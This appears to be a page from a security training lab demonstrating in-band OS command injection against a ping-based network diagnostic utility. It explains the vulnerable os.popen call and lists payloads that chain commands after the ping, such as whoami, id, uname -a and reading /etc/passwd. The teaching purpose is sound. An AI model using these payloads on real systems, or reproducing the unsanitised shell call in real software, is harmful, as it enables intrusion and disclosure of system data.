OS Command Injection – In-band (Output Returned)

Demonstrates OS command injection where the system command output is directly returned in the HTTP response.

The server provides a "Network Diagnostic Utility" that executes the system ping utility to test connectivity to an IP or domain.

⚠ Vulnerable Ping ✓ Secure Ping

🎯 Exploit Payloads to Try

The vulnerable endpoint uses os.popen(f"ping -c 2 {target}"), allowing command chaining via shell metacharacters.

  • 127.0.0.1; whoami — Execute whoami after the ping finishes
  • 127.0.0.1; id — View user ID and group permissions
  • 127.0.0.1; uname -a — View operating system details
  • 127.0.0.1 && cat /etc/passwd — Read file contents
